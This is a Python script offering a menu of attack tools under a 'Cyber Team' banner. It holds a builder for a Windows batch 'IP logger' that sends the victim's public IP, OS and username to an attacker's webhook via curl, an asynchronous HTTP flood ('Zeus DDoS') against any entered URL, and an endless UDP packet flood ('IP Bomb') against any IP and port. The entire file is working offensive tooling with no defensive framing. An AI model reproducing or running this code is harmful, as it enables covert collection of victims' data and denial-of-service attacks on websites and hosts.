global packets  # declared global variables at the top
global fetches
import aiohttp
import asyncio
import time
import sys
import colorama
import os
from pystyle import *
import socket

colorama.init(convert=True, autoreset=True)
colorama.just_fix_windows_console()
import requests

def buildlogger(webhook):
    code = f'''@echo off
:: WEBHOOK
set webhook={webhook}

:: GETTING THE IP
curl ifconfig.co/ > ip.txt
set /p ip=<ip.txt
del ip.txt

curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%ip%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%os%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"%username%\\"}}" %webhook%
'''
    with open('iplogger.bat', 'w', encoding='utf-8') as f:
        f.write(code)
    print('[+] File \'iplogger.bat\' created successfully.')

fetches = 0
packets = 0
port = 8080

def send_packet(ipa, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto('Cyber DoS'.encode('utf-8'), (ipa, port))
    except socket.error as e:
        print(f'Socket error: {e}')
    finally:
        if 's' in locals():
            s.close()

def ipbomb(ip, port):
    global packets
    os.system('cls') if os.name == 'nt' else os.system('clear')
    while True:
        send_packet(ip, port)
        packets += 1
        sys.stdout.write(f'\rPackets sent: {packets} | IP: {ip}, Port: {port}')
        sys.stdout.flush()

ascii_art = f'''
{colorama.Fore.RED} ▄████▄▓██   ██▓ ▄▄▄▄   ▓█████  ██▀███ {colorama.Fore.BLUE}▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓      
{colorama.Fore.RED}▒██▀ ▀█ ▒██  ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██{colorama.Fore.BLUE}▒▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒      
{colorama.Fore.RED}▒▓█    ▄ ▒██ ██░▒██▒ ▄██▒███   ▓██ ░▄█ {colorama.Fore.BLUE}▒▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░      
{colorama.Fore.RED}▒▓▓▄ ▄██▒░ ▐██▓░▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄{colorama.Fore.BLUE}  ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██       
{colorama.Fore.RED}▒ ▓███▀ ░░ ██▒▓░░▓█  ▀█▓░▒████▒░██▓ ▒██▒{colorama.Fore.BLUE}  ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒      
{colorama.Fore.RED}░ ░▒ ▒  ░ ██▒▒▒ ░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░{colorama.Fore.BLUE}  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░      
{colorama.Fore.RED}  ░  ▒  ▓██ ░▒░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░ {colorama.Fore.BLUE}   ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░      
{colorama.Fore.BLUE}░       ▒ ▒ ░░   ░    ░    ░     ░░   ░  {colorama.Fore.RED} ░         ░    ░   ▒   ░      ░         
{colorama.Fore.BLUE}         ░  ░     ░  ░       ░         
{colorama.Fore.RED}░       ░ ░           ░                    {colorama.Fore.BLUE}                                       
{colorama.Fore.RESET}    
'''
print(ascii_art)
print(f'{colorama.Fore.RED}[1] {colorama.Fore.BLUE}| {colorama.Fore.MAGENTA}IP Logger (Fetch IP){colorama.Fore.RESET}')
print(f'{colorama.Fore.RED}[2] {colorama.Fore.BLUE}| {colorama.Fore.MAGENTA}Zeus DDoS (Version 500w Fast){colorama.Fore.RESET}')
print(f'{colorama.Fore.RED}[3] {colorama.Fore.BLUE}| {colorama.Fore.MAGENTA}IP Bomb (PC Reset){colorama.Fore.RESET}')
print(f'{colorama.Fore.RED}[4] {colorama.Fore.BLUE}| {colorama.Fore.MAGENTA}Exit{colorama.Fore.RESET}')
choice = input(f'{colorama.Fore.YELLOW}$> ')

async def flood(session, url):
    global fetches
    while True:
        try:
            async with session.get(url) as response:
                fetches += 1
                sys.stdout.write(f'\rStatus: {response.status} | Requests: [{fetches}]')
                sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f'\rError: {e}')
            sys.stdout.flush()

async def main(url):
    async with aiohttp.ClientSession() as session:
        tasks = [flood(session, url) for _ in range(100)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        choice = int(choice)
        if choice == 1:
            os.system('cls') if os.name == 'nt' else os.system('clear')
            web = input('Insert the URL of your webhook: ')
            buildlogger(web)
        elif choice == 2:
            os.system('cls') if os.name == 'nt' else os.system('clear')
            url = input('Enter your website (with https/http): ')
            asyncio.run(main(url))
        elif choice == 3:
            hostip = input('Enter the IP: ')
            port_input = input('Enter the port (default 8080): ')
            try:
                port = int(port_input) if port_input else 8080
            except ValueError:
                print('Invalid port! Using default 8080.')
                port = 8080
            ipbomb(hostip, port)
        elif choice == 4:
            pass
        else:
            print('Invalid choice!')
    except ValueError:
        print('Please enter a valid number (1-4)')
